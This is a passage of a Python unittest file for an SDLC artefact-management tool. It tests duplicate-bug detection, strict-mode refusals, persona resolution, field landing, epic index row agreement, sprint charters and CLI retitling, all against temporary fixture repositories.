            self.assertEqual([c["id"] for c in ff_out], [c["id"] for c in art_out])
            # the deleted second implementation's scorer is no longer referenced by file_finding
            src = (Path(file_finding.__file__).read_text(encoding="utf-8"))
            self.assertNotIn("_jaccard", src.split("def duplicate_candidates")[1]
                             .split("\ndef ")[0])

    def test_the_motivating_pair_is_still_caught(self) -> None:
        """AC2. The motivating pair scores 0.21 by the deleted Jaccard scorer (under any sane bar)
        and 0.44 by the surviving containment scorer - so BOTH entry points must now catch it,
        where the Jaccard path would have missed the very duplicate it exists for."""
        import file_finding
        repo, td = self._repo()
        with td:
            self._bug(repo, "BG0269", self.EXISTING)
            fields = {"affects": "src/thing.py"}
            via_finding = file_finding.duplicate_candidates(repo, self.REFILING, fields)
            via_mint = artifact.duplicate_candidates(repo, "bug", self.REFILING, fields)
            self.assertIn("BG0269", [c["id"] for c in via_finding])
            self.assertIn("BG0269", [c["id"] for c in via_mint])

    def test_a_terminal_artefact_is_in_scope_from_both_paths(self) -> None:
        """AC3. Re-filing something already fixed wastes the most time, so a CLOSED artefact with
        the same title must still be reported - through BOTH entry points, since the narrower
        open-only scope must not win the merge."""
        import file_finding
        repo, td = self._repo()
        with td:
            self._bug(repo, "BG0269", self.EXISTING, status="Fixed")   # terminal
            fields = {"affects": "src/thing.py"}
            via_finding = file_finding.duplicate_candidates(repo, self.REFILING, fields)
            via_mint = artifact.duplicate_candidates(repo, "bug", self.REFILING, fields)
            self.assertIn("BG0269", [c["id"] for c in via_finding])     # not dropped for being closed
            self.assertIn("BG0269", [c["id"] for c in via_mint])


class DuplicateStrictTests(unittest.TestCase):
    """US0414: advisory by default - filing must never be blocked by a heuristic, or the heuristic
    becomes a reason not to file - and refusable under `--strict`, where the refusal leaves NO file
    and NO index row (a half-minted artefact is worse than no refusal)."""

    def _repo(self) -> tuple[Path, tempfile.TemporaryDirectory]:
        td = tempfile.TemporaryDirectory()
        repo = Path(td.name)
        _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
        DuplicateCheckTests._bug(DuplicateCheckTests(), repo, "BG0269",
                                 DuplicateCheckTests.EXISTING)
        return repo, td

    FIELDS = {"severity": "High", "points": 2, "affects": "src/thing.py"}

    def test_advisory_by_default_mints_and_reports(self) -> None:
        repo, td = self._repo()
        with td:
            r = artifact.new(repo, "bug", DuplicateCheckTests.REFILING, dict(self.FIELDS))
            self.assertTrue(Path(r["path"]).exists())        # minted anyway
            self.assertEqual([c["id"] for c in r["duplicate_warnings"]], ["BG0269"])

    def test_strict_refuses_and_writes_nothing(self) -> None:
        repo, td = self._repo()
        with td:
            idx = repo / "sdlc-studio" / "bugs" / "_index.md"
            before_index = idx.read_text(encoding="utf-8")
            before_files = sorted(p.name for p in (repo / "sdlc-studio" / "bugs").glob("*.md"))
            with self.assertRaises(artifact.DuplicateRefused) as cm:
                artifact.new(repo, "bug", DuplicateCheckTests.REFILING, dict(self.FIELDS),
                             strict=True)
            self.assertIn("BG0269", str(cm.exception))
            # NO file and NO index row - and no id burnt either: the next mint takes BG0270.
            self.assertEqual(sorted(p.name for p in (repo / "sdlc-studio" / "bugs").glob("*.md")),
                             before_files)
            self.assertEqual(idx.read_text(encoding="utf-8"), before_index)
            ok = artifact.new(repo, "bug", "an entirely unrelated dashboard regression",
                              dict(self.FIELDS))
            self.assertEqual(ok["id"], "BG0270")

    def test_strict_does_not_refuse_a_clean_title(self) -> None:
        # The negative control: --strict is not "refuse everything".
        repo, td = self._repo()
        with td:
            r = artifact.new(repo, "bug", "the status dashboard prints stale velocity",
                             dict(self.FIELDS), strict=True)
            self.assertTrue(Path(r["path"]).exists())

    def test_the_cli_strict_flag_exits_non_zero_and_names_the_id(self) -> None:
        import contextlib
        import io
        repo, td = self._repo()
        with td:
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                rc = artifact.main(["new", "--type", "bug", "--title",
                                    DuplicateCheckTests.REFILING, "--severity", "High",
                                    "--points", "2", "--affects", "src/thing.py",
                                    "--strict", "--root", str(repo)])
            self.assertEqual(rc, 2)
            self.assertIn("BG0269", err.getvalue())


PERSONA_INDEX = (
    "# Persona Index\n\n"
    "## Primary (the design target)\n\n"
    "- [Maya Okafor](maya-okafor-founder-engineer.md) - solo founder-engineer. Well-formed.\n\n"
    "## Secondary (served, never at the Primary's expense)\n\n"
    "- [Jonah Reyes](jonah-reyes-team-lead.md) - small-team lead. Well-formed.\n\n"
    "## Negative (deliberately not designed for)\n\n"
    "- [Trevor Hale](trevor-hale-enterprise-pm.md) - enterprise delivery manager. A signal to\n"
    "  decline, not a backlog.\n"
)


def _registry(repo: Path) -> None:
    """Give the fixture project a design-persona registry."""
    pdir = repo / "sdlc-studio" / "personas"
    pdir.mkdir(parents=True, exist_ok=True)
    (pdir / "index.md").write_text(PERSONA_INDEX, encoding="utf-8")
    for stem in ("maya-okafor-founder-engineer", "jonah-reyes-team-lead",
                 "trevor-hale-enterprise-pm"):
        (pdir / f"{stem}.md").write_text(f"# {stem}\n", encoding="utf-8")


def _persona_line(path) -> str | None:
    return sdlc_md.extract_field(Path(path).read_text(encoding="utf-8"), "Persona")


def _stories(repo: Path) -> list[str]:
    d = repo / "sdlc-studio" / "stories"
    return sorted(p.name for p in d.glob("*.md") if p.name != "_index.md")


class PersonaResolutionTests(unittest.TestCase):
    """US0448: `--persona` resolves through the registry - the declared Primary by default, a
    warning on a name the registry does not declare, a refusal under --strict, and (D0066) a
    warning but NEVER a refusal for the Negative persona."""

    def _repo(self, d: str) -> Path:
        repo = Path(d)
        _index(repo, "story", "| ID | Title | Status | Epic | Created |")
        _epic(repo)
        _registry(repo)
        return repo

    def _mint(self, repo: Path, fields: dict, strict: bool = False):
        import contextlib
        import io
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            r = artifact.new(repo, "story", "a story", {"epic": "EP0001", **fields},
                             strict=strict)
        return r, err.getvalue()

    def test_omitted_persona_defaults_to_the_declared_primary(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            r, _ = self._mint(repo, {})
            self.assertEqual(_persona_line(r["path"]), "Maya Okafor")

    def test_unregistered_persona_warns_and_strict_refuses(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            r, err = self._mint(repo, {"persona": "Nobody Real"})
            self.assertEqual(_persona_line(r["path"]), "Nobody Real")
            self.assertIn("Nobody Real", err)
            self.assertIn("Maya Okafor", err)       # the warning names who IS registered
            before = _stories(repo)
            with self.assertRaises(ValueError) as cm:
                self._mint(repo, {"persona": "Nobody Real"}, strict=True)
            self.assertIn("Nobody Real", str(cm.exception))
            self.assertEqual(_stories(repo), before, "strict refusal still minted a story")

    def test_negative_persona_warns_but_is_never_refused(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            r, err = self._mint(repo, {"persona": "Trevor Hale"})
            self.assertEqual(_persona_line(r["path"]), "Trevor Hale")
            self.assertIn("negative", err.lower())
            # ... and --strict does not turn the signal into a refusal (D0066)
            r2, err2 = self._mint(repo, {"persona": "Trevor Hale"}, strict=True)
            self.assertEqual(_persona_line(r2["path"]), "Trevor Hale")
            self.assertIn("negative", err2.lower())

    def test_an_absent_registry_leaves_the_persona_alone(self) -> None:
        # The honest-absence path: no registry means no design target to resolve against, so a
        # named persona passes through and an omitted one stays absent - never a fabricated default.
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created |")
            _epic(repo)
            r, err = self._mint(repo, {})
            self.assertIsNone(_persona_line(r["path"]))
            r2, _ = self._mint(repo, {"persona": "Anyone"}, strict=True)
            self.assertEqual(_persona_line(r2["path"]), "Anyone")

    def test_an_unreadable_registry_says_so_rather_than_standing_down_silently(self) -> None:
        # A registry that EXISTS but cannot be parsed is not the same as no registry: resolving
        # nothing and saying nothing would report a persona-resolved mint that never resolved one.
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created |")
            _epic(repo)
            pdir = repo / "sdlc-studio" / "personas"
            pdir.mkdir(parents=True, exist_ok=True)
            (pdir / "index.md").write_text("# Persona Index\n\nprose, no role headings\n",
                                           encoding="utf-8")
            r, err = self._mint(repo, {})
            self.assertIsNone(_persona_line(r["path"]))
            self.assertIn("index.md", err)
            self.assertIn("Primary", err)


class BatchPersonaResolutionTests(unittest.TestCase):
    """US0449: `batch` resolves the persona per story by the same rules `new` applies."""

    def _repo(self, d: str) -> Path:
        repo = Path(d)
        _index(repo, "story", "| ID | Title | Status | Epic | Created |")
        _epic(repo)
        _registry(repo)
        return repo

    def test_batch_resolves_the_persona_per_story(self) -> None:
        import contextlib
        import io
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                r = artifact.new_batch(repo, "story", [
                    {"title": "omits the persona", "epic": "EP0001"},
                    {"title": "names the primary", "epic": "EP0001", "persona": "Maya Okafor"},
                    {"title": "names a stranger", "epic": "EP0001", "persona": "Nobody Real"},
                ])
            got = {Path(c["path"]).stem.split("-", 1)[1]: _persona_line(c["path"])
                   for c in r["created"]}
            self.assertEqual(got["omits-the-persona"], "Maya Okafor")
            self.assertEqual(got["names-the-primary"], "Maya Okafor")
            self.assertEqual(got["names-a-stranger"], "Nobody Real")
            self.assertIn("Nobody Real", err.getvalue())


class SuppliedContentLandsTests(unittest.TestCase):
    """A creator that accepts content and drops it hands back exit 0 over a document the
    caller's words never reached. By the time a downstream floor objects the words are gone
    and somebody has to invent replacements, so the drop has to be refused where it happens."""

    CRITERIA = ["THE FIRST CRITERION", "THE SECOND CRITERION"]

    def test_a_bug_filed_with_criteria_carries_them(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created |")
            _groom_stubs(repo)
            r = artifact.new(repo, "bug", "a defect", {**GROOM, "acs": self.CRITERIA})
            body = Path(r["path"]).read_text()
            self.assertIn("## Acceptance Criteria", body)
            for c in self.CRITERIA:
                self.assertIn(c, body)

    def test_a_bare_string_of_criteria_is_ONE_criterion(self) -> None:
        """`--fields-file` accepts arbitrary JSON, so `"acs": "the fix holds"` is a shape a
        caller reaches for. Iterating a string character by character produced 31 criteria
        reading `- [ ] t`, `- [ ] h`, `- [ ] e` at exit 0 - through BOTH filers."""
        import file_finding
        self.assertEqual(artifact._list({"acs": "the fix holds"}, "acs"), ["the fix holds"])
        self.assertEqual(
            file_finding.criteria_block("bug", {"acs": "the fix holds"}).count("- [ ]"), 1)

    def test_a_batch_refusal_leaves_NOTHING_on_disk(self) -> None:
        """`new_batch` documents all-or-nothing. The drop check ran inside the write loop, so
        items 1..N-1 were already written, indexed and epic-wired when item N was refused."""
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created |")
            _groom_stubs(repo)
            before = sorted(p.name for p in (repo / "sdlc-studio" / "bugs").glob("BG*.md"))
            # The lander means a real drop is now rare, so the REFUSAL is provoked directly.
            # What this pins is where the check RUNS: in the pre-write validation loop, not in
            # the write loop, which is the placement that leaked items 1..N-1 onto disk.
            real = artifact._refuse_dropped_content
            calls = {"n": 0}

            def refuse_on_the_second(body, type_, f):
                calls["n"] += 1
                if calls["n"] == 2:
                    raise artifact.ContentDropped("provoked on item two")
                return real(body, type_, f)

            artifact._refuse_dropped_content = refuse_on_the_second
            try:
                with self.assertRaises(artifact.ContentDropped):
                    artifact.new_batch(repo, "bug", [
                        {"title": "item one", **GROOM, "acs": ["alpha"]},
                        {"title": "item two", **GROOM, "acs": ["beta"]},
                    ])
            finally:
                artifact._refuse_dropped_content = real
            after = sorted(p.name for p in (repo / "sdlc-studio" / "bugs").glob("BG*.md"))
            self.assertEqual(before, after, "a refused batch left artefacts on disk")
            idx = (repo / "sdlc-studio" / "bugs" / "_index.md").read_text()
            self.assertNotIn("item one", idx, "a refused batch left an index row behind")

    def test_the_two_filing_paths_agree_on_a_bug_s_criteria(self) -> None:
        """`artifact.new` and `file_finding.file` build the same artefact. Two paths that
        disagree about what a supplied criterion MEANS is the defect; the looser one is the
        one that runs."""
        import file_finding
        # The filer demands a complete finding; the creator does not. The fields below are
        # the intersection both accept, so the comparison is about the CRITERIA and not about
        # which path has the stricter completeness rule.
        fields = {**GROOM, "acs": self.CRITERIA, "summary": "s", "steps": "s", "fix": "f",
                  "severity": "Low", "priority": "Low"}
        counts = []
        for build in ("artifact", "file_finding"):
            with tempfile.TemporaryDirectory() as d:
                repo = Path(d)
                _index(repo, "bug", "| ID | Title | Status | Severity | Created |")
                _groom_stubs(repo)
                if build == "artifact":
                    path = Path(artifact.new(repo, "bug", "a defect", dict(fields))["path"])
                else:
                    path = Path(file_finding.file_finding(repo, "bug", "a defect", dict(fields))
                                ["path"])
                counts.append(sdlc_md.count_acs(path.read_text()))
        self.assertEqual(counts[0], counts[1])
        self.assertEqual(counts[0], len(self.CRITERIA))

    def test_a_field_the_scaffold_lacks_is_LANDED_rather_than_refused(self) -> None:
        """The contract improved under review. Refusing a caller's whole artefact because the
        TEMPLATE lacks a heading is a worse outcome than the silent drop it replaced - and the
        verdict depended on which template was selected, so `--summary` on a story succeeded
        with `--template full` and was refused without it. Nothing supplied is dropped, and
        nothing is refused for a heading that can simply be appended."""
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "rfc", "| ID | Title | Status | Created |")
            _groom_stubs(repo)
            r = artifact.new(repo, "rfc", "a design question",
                             {**GROOM_REQUEST, "acs": self.CRITERIA})
            body = Path(r["path"]).read_text()
            for c in self.CRITERIA:
                self.assertIn(c, body)

    def test_every_supplied_field_lands_for_every_non_meta_type(self) -> None:
        """The property, asserted over the whole matrix rather than one example. `retro`,
        `review` and `handoff` are excluded because they route through `meta_new` and never
        reach this renderer at all."""
        fields = {"summary": "zebra alpha summary", "steps": "quokka steps",
                  "fix": "narwhal fix", "impact": "ocelot impact", "acs": ["dingo one"],
                  "options": ["puffin one"], "recommendation": "lemur rec"}
        for type_ in artifact.SPEC:
            if type_ in artifact.META:
                continue
            for key, value in fields.items():
                with self.subTest(type=type_, field=key):
                    f = {"date": "2026-07-28", key: value}
                    body = artifact._land_supplied(
                        artifact._render(type_, "XX0001", "T", "2026-07-28", f), type_, f)
                    artifact._refuse_dropped_content(body, type_, f)   # must not raise

    def test_the_refusal_still_fires_when_a_field_genuinely_cannot_land(self) -> None:
        """The backstop must remain able to fail, or it is a guard that cannot - which is the
        defect this sprint filed three of."""
        with self.assertRaises(artifact.ContentDropped):
            artifact._refuse_dropped_content("# X: t\n\nnothing here\n", "bug",
                                             {"summary": "a value that reached nothing"})

    def test_the_check_is_structural_not_a_list_of_types(self) -> None:
        """The defect was an enumeration - ('story', 'cr', 'epic') - and an enumeration
        silently exempts what it forgot. Every type that RENDERS the field must pass and
        every type that does not must be refused, decided by reading the rendered document
        rather than by any list this test could go stale against."""
        stores, refuses = [], []
        for t in artifact.SPEC:
            fields = {"acs": self.CRITERIA}
            render = artifact._select_render(Path("."), t, None)
            body = render(t, "XX0999", "probe", "2026-07-28", dict(fields))
            landed = all(c in body for c in self.CRITERIA)
            try:
                artifact._refuse_dropped_content(body, t, dict(fields))
                refused = False
            except artifact.ContentDropped:
                refused = True
            # The verdict tracks the DOCUMENT, in both directions: nothing rendered is
            # refused, and nothing dropped is accepted.
            self.assertEqual(landed, not refused, f"{t}: landed={landed} refused={refused}")
            (stores if landed else refuses).append(t)
        self.assertIn("bug", stores)     # the unit this bug was filed for
        self.assertIn("story", stores)
        self.assertTrue(refuses, "no type refuses, so the check cannot be failing on anything")


class ArtifactNewNormalisesFencesTooTests(unittest.TestCase):
    """M15 from the guard review: the `artifact.py` half of the fence fix was entirely
    uncovered - every test exercised `file_finding._render` only, so deleting the call here
    survived. Two writers inherit the normaliser; two writers need holding."""

    def test_a_bare_fence_in_an_artifact_body_is_labelled(self) -> None:
        import sys
        from pathlib import Path as _P
        sys.path.insert(0, str(_P(__file__).resolve().parent.parent / "lib"))
        import sdlc_md as _md
        body = "# X\n\n> **Status:** Open\n\n## Summary\n\n```\ngit status\n```\n"
        self.assertIn("```text\ngit status\n```", _md.normalise_fence_languages(body))

    def test_the_writer_calls_it(self) -> None:
        """The call SITE, not the helper. Asserted by source because `artifact new` needs a
        full workspace; the helper's own behaviour is covered above and in test_file_finding."""
        import inspect
        src = inspect.getsource(artifact)
        self.assertIn("normalise_fence_languages", src,
                      "artifact.py does not normalise fences, so it can mint an artefact "
                      "markdownlint MD040 refuses")


TEMPLATE_EPIC_INDEX = (SCR.parent / "templates" / "indexes" / "epic.md")


class EpicRowAgreementTests(unittest.TestCase):
    """A minted epic row equals the row the derivation would write (US0478).

    Two definitions of an epic row existed and neither knew about the other: the shipped template
    declared `Owner`/`Stories`/`Target`, this repository's live index declares
    `Stories`/`Deps`/`Created`/`Updated`, and `row_from_header` had a branch for none of the four -
    so every mint filled them with `--` and a freshly minted epic was born drifted against the
    derivation that maintains it. This is the agreement check; the column definition itself lives
    in `lib/sdlc_md.py` and is imported here rather than restated.
    """

    def _canonical_index(self, repo: Path) -> None:
        header = "| " + " | ".join(sdlc_md.EPIC_INDEX_COLUMNS) + " |"
        _index(repo, "epic", header)

    def test_the_minted_row_equals_the_derived_row(self) -> None:
        """AC1, cell by cell against the derivation - not against a literal row, which would only
        prove the test and the mint agree with each other.

        MUTANT: drop the `derived=` argument at the mint site. Stories falls to the
        unrecognised-column `--`, the row disagrees with the derivation on its first cell, and
        `reconcile detect` reports the new epic as drifted the moment it is created.
        """
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            self._canonical_index(repo)
            r = artifact.new(repo, "epic", "an epic", {"affects": "src/a.py", "size": "M"})
            rec = r["id"]
            text = (repo / "sdlc-studio" / "epics" / "_index.md").read_text(encoding="utf-8")
            row = next(l for l in text.splitlines() if l.startswith(f"| [{rec}]"))
            cells = reconcile._split_row_cells(row)
            columns = list(sdlc_md.EPIC_INDEX_COLUMNS)
            derived = sdlc_md.derive_epic_row_cells(repo, rec)
            for name, value in derived.items():
                with self.subTest(column=name):
                    self.assertEqual(value, cells[columns.index(name)],
                                     f"the minted {name} cell disagrees with the derivation")
            self.assertEqual("0", cells[columns.index("Stories")],
                             "a new epic must be minted with a censused zero, not a placeholder")
            self.assertEqual(sdlc_md.CELL_NOT_STATED, cells[columns.index("Deps")],
                             "a scaffold declares no Dependencies section, so Deps must stay "
                             "not-stated rather than claiming the epic has no dependencies")
            self.assertEqual([], reconcile.epic_index_derivable_drift(repo),
                             "the freshly minted epic is already drifted")

    def test_wiring_a_story_updates_the_stories_cell_on_both_mint_paths(self) -> None:
        """AC2, and the two paths are asserted SEPARATELY because the batch path is the one that
        skipped the wiring.

        MUTANT: refresh on the single path only. The batch path - which is how `refine --into` and
        every sprint scaffold create stories - leaves the epic's count stale until someone
        remembers to reconcile, which is the claim this tooling makes and would not be keeping.
        """
        for path_name in ("single", "batch"):
            with self.subTest(mint=path_name), tempfile.TemporaryDirectory() as d:
                repo = Path(d)
                self._canonical_index(repo)
                _index(repo, "story", "| ID | Title | Status | Points | Epic | Created |")
                ep = artifact.new(repo, "epic", "an epic",
                                  {"affects": "src/a.py", "size": "M"})["id"]
                _epic(repo, ep)     # the epic file needs a Story Breakdown to wire into
                index = repo / "sdlc-studio" / "epics" / "_index.md"
                columns = list(sdlc_md.EPIC_INDEX_COLUMNS)

                def stories_cell() -> str:
                    row = next(l for l in index.read_text(encoding="utf-8").splitlines()
                               if l.startswith(f"| [{ep}]"))
                    return reconcile._split_row_cells(row)[columns.index("Stories")]

                self.assertEqual("0", stories_cell())
                fields = {"epic": ep, "affects": "src/a.py", "points": 2}
                if path_name == "single":
                    artifact.new(repo, "story", "a story", dict(fields))
                else:
                    artifact.new_batch(repo, "story",
                                       [{"title": "a story", **fields}], dict(fields))
                self.assertEqual("1", stories_cell(),
                                 f"the {path_name} mint path left the epic's Stories cell stale")
                self.assertEqual([], reconcile.epic_index_derivable_drift(repo),
                                 f"the {path_name} path left the index drifted")

    def test_the_template_header_equals_the_canonical_column_definition(self) -> None:
        """AC3, with neither side restated as a literal here. Whichever column set is chosen, the
        shipped template and the tooling cannot disagree again - and a consuming project installs
        the template, so a template teaching a column set nothing writes teaches it to everyone.
        """
        text = TEMPLATE_EPIC_INDEX.read_text(encoding="utf-8")
        header = next(l for l in text.splitlines()
                      if l.startswith("| ID |") and "Status" in l)
        declared = tuple(c.strip() for c in reconcile._split_row_cells(header))
        self.assertEqual(sdlc_md.EPIC_INDEX_COLUMNS, declared,
                         "the shipped epic-index template and the canonical column definition "
                         "declare different columns")
        # ...and the template's own data row has a cell per column, or it renders a broken table.
        row = next(l for l in text.splitlines() if l.startswith("| [EP{{epic_id}}]"))
        self.assertEqual(len(declared), len(reconcile._split_row_cells(row)),
                         "the template's data row does not have one cell per declared column")

    def test_a_non_epic_mint_is_unaffected(self) -> None:
        """The control. Passing `derived=` only for an epic means every other type still fills its
        unrecognised columns with the placeholder, which several index shapes rely on."""
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Stories | Created |")
            r = artifact.new(repo, "bug", "a defect", dict(GROOM))
            text = (repo / "sdlc-studio" / "bugs" / "_index.md").read_text(encoding="utf-8")
            row = next(l for l in text.splitlines() if l.startswith(f"| [{r['id']}]"))
            self.assertEqual(sdlc_md.CELL_NOT_STATED, reconcile._split_row_cells(row)[3],
                             "a bug index that happens to carry a Stories column was censused")


class SprintCharterTests(unittest.TestCase):
    """US0487. A charter is the SHAPE of a run that has not happened - goal, scope rule,
    appetite - so `sprint next` can open a run from it against the backlog as it stands at that
    moment rather than as it stood when the charter was written.

    MUTANTS:
      1. drop `charter` from `_DASH` -> the type is unknown to the creator.
      2. hardcode the charter's statuses beside the charter code instead of deriving them.
      3. drop the `check_charter` call from the creation path -> a scopeless charter is minted.
    """

    def _repo(self, d: Path) -> Path:
        repo = Path(d)
        (repo / "sdlc-studio" / "charters").mkdir(parents=True)
        (repo / "sdlc-studio" / "charters" / "_index.md").write_text(
            "# Sprint Charter Queue\n\n**Last Updated:** 2026-01-01\n\n## Queue\n\n"
            "| ID | Title | Status | Appetite | Created |\n| --- | --- | --- | --- | --- |\n",
            encoding="utf-8")
        return repo

    _FIELDS = {"goal": "the run drives to a measurable close",
               "scope": "every unit CR0507 decomposes into",
               "appetite": "480min/8units"}

    def test_a_charter_is_minted_with_an_allocated_id_and_index_row(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(Path(d))
            r = artifact.new(repo, "charter", "a planned run", dict(self._FIELDS))
            self.assertTrue(r["id"].startswith("SC"), r["id"])
            body = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("> **Status:** Queued", body)
            self.assertIn("## Sprint Goal", body)
            self.assertIn("the run drives to a measurable close", body)
            self.assertIn("## Scope rule", body)
            self.assertIn("> **Appetite:** 480min/8units", body)
            index = (repo / "sdlc-studio" / "charters" / "_index.md").read_text(encoding="utf-8")
            self.assertIn(r["id"], index, "no index row was appended")

    def test_the_charter_reaches_the_SHIPPED_ENTRY_POINT_not_only_the_library(self) -> None:
        """The lane-check refused the first attempt at this unit for exactly the reason it
        refused US0467 last run: all three verifiers called `artifact.new` as a library, and the
        wiring - the CLI verb, its `--type` choice, its field whitelist - is the part a library
        test does not exercise. Twice in two runs, so it is pinned here rather than remembered.

        MUTANT: drop `charter` from `_DASH` (which builds SPEC, which builds the CLI's `--type`
        choices) or from `FIELDS_FILE_KEYS`. This test must redden."""
        import contextlib
        import io
        import json as _json
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(Path(d))
            fields = repo / "fields.json"
            fields.write_text(_json.dumps(self._FIELDS), encoding="utf-8")
            out = io.StringIO()
            with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
                rc = artifact.main(["new", "--type", "charter", "--title", "a planned run",
                                    "--fields-file", str(fields), "--root", str(repo)])
            printed = out.getvalue()
            self.assertEqual(rc, 0, printed)
            self.assertIn("SC0001", printed, "the CLI minted no charter")
            body = (repo / "sdlc-studio" / "charters" / "SC0001-a-planned-run.md").read_text(
                encoding="utf-8")
            self.assertIn("## Sprint Goal", body)
            self.assertIn("> **Appetite:** 480min/8units", body,
                          "the CLI's field whitelist dropped a charter field")

    def test_a_charter_without_a_goal_or_scope_is_refused(self) -> None:
        """Refused BEFORE an id is allocated, so a bad invocation costs a message rather than
        burning an id - the same contract `check_groomed` holds for a bug."""
        for label, fields in (("no goal", {"scope": "x"}),
                              ("no scope", {"goal": "x"}),
                              ("neither", {})):
            with self.subTest(label), tempfile.TemporaryDirectory() as d:
                repo = self._repo(Path(d))
                with self.assertRaises(ValueError) as caught:
                    artifact.new(repo, "charter", "a planned run", dict(fields))
                msg = str(caught.exception)
                self.assertIn("refused", msg)
                if "goal" not in fields:
                    self.assertIn("Sprint Goal", msg)
                if "scope" not in fields:
                    self.assertIn("scope rule", msg)
                minted = list((repo / "sdlc-studio" / "charters").glob("SC*.md"))
                self.assertEqual(minted, [], "an id was burnt on a refused charter")

    def test_the_status_vocabulary_is_derived_from_the_shared_source(self) -> None:
        """AC3. The permitted states come from `lib.sdlc_md`, so the charter code and the
        validator, transition gate and archiver cannot disagree about what Queued or Spent
        means. Asserted as IDENTITY against the shared source rather than by re-listing the
        states here - a second list in the test is the same defect as a second list in the code.
        """
        self.assertEqual(artifact.SPEC["charter"]["status"], sdlc_md.create_status("charter"))
        self.assertEqual(artifact.SPEC["charter"]["terminal"],
                         sdlc_md.default_terminal_status("charter"))
        vocab = sdlc_md.status_vocab("charter")
        self.assertIn(artifact.SPEC["charter"]["status"], vocab)
        self.assertTrue(sdlc_md.terminal_statuses("charter") <= set(vocab),
                        "a terminal status the vocabulary does not define")
        self.assertEqual(sdlc_md.ARTIFACT_TYPES["charter"][1], "SC")


class CreatorResolverAgreementTests(unittest.TestCase):
    """BG0619: the two artefacts `sprint close` mints every run were the two it could not touch.

    `artifact.py retitle --id RETRO0109` and `--id HO0063` both refused during a real close, and
    both had to be renamed by hand across the file, the H1 and the index row, plus an inbound
    link. RETRO is excluded here and the reason is recorded on the artefact: `retros/_index.md`
    has no Title column, so there is no row to update - that is BG0632.
    """

    _SCRIPT = Path(__file__).resolve().parent.parent / "artifact.py"

    def _root(self, d):
        root = Path(d)
        (root / "sdlc-studio").mkdir(parents=True)
        (root / "sdlc-studio" / ".config.yaml").write_text("schema_version: 3\n", encoding="utf-8")
        for rel, rid in (("handoffs", "HO0001"), ("reviews", "RV0001")):
            dd = root / "sdlc-studio" / rel
            dd.mkdir(parents=True)
            (dd / f"{rid}-old-title.md").write_text(
                f"# {rid}: old title\n\n> **Date:** 2026-08-27\n", encoding="utf-8")
            (dd / "_index.md").write_text(
                f"# {rel.title()}\n\n| ID | Title | Date |\n| --- | --- | --- |\n"
                f"| [{rid}]({rid}-old-title.md) | old title | 2026-08-27 |\n", encoding="utf-8")
        return root

    def _retitle(self, root, rid, title):
        import subprocess  # noqa: PLC0415
        return subprocess.run(
            [sys.executable, str(self._SCRIPT), "retitle", "--root", str(root),
             "--id", rid, "--title", title],
            capture_output=True, text=True, timeout=300, check=False)

    def test_the_retitle_command_renames_a_handoff_and_a_review(self) -> None:
        # AC3. Through the SHIPPED command: the bug's evidence is a CLI refusal, and a library
        # test cannot see the hard `ARTIFACT_TYPES[type_]` lookups on that path raising KeyError
        # on the type retitle has just resolved.
        with tempfile.TemporaryDirectory() as d:
            root = self._root(d)
            for rel, rid in (("handoffs", "HO0001"), ("reviews", "RV0001")):
                with self.subTest(rid=rid):
                    r = self._retitle(root, rid, "a corrected title")
                    self.assertEqual(0, r.returncode, r.stdout + r.stderr)
                    dd = root / "sdlc-studio" / rel
                    renamed = dd / f"{rid}-a-corrected-title.md"
                    self.assertTrue(renamed.exists(), sorted(p.name for p in dd.iterdir()))
                    self.assertTrue(
                        renamed.read_text(encoding="utf-8").startswith(
                            f"# {rid}: a corrected title"))
                    self.assertIn("a corrected title",
                                  (dd / "_index.md").read_text(encoding="utf-8"))

    def test_the_renamed_index_row_link_resolves(self) -> None:
        # AC4. Asserted APART from AC3 because it fails independently: `_swap` resolved the link
        # target through `extract_record_id`, whose alternation returns None for a meta stem, so
        # a rename could leave the H1, the slug and the title cell all correct, exit 0, and only
        # the link dangling.
        with tempfile.TemporaryDirectory() as d:
            root = self._root(d)
            r = self._retitle(root, "HO0001", "a corrected title")
            self.assertEqual(0, r.returncode, r.stdout + r.stderr)
            dd = root / "sdlc-studio" / "handoffs"
            index = (dd / "_index.md").read_text(encoding="utf-8")
            self.assertIn("HO0001-a-corrected-title.md", index,
                          "the row's link target was not rewritten")
            self.assertNotIn("HO0001-old-title.md", index, "a dangling link survived the rename")
            import re as _re  # noqa: PLC0415
            target = _re.search(r"\(([^)]+\.md)\)", index).group(1)
            self.assertTrue((dd / target).exists(), f"index link {target!r} does not resolve")


if __name__ == "__main__":
    unittest.main()
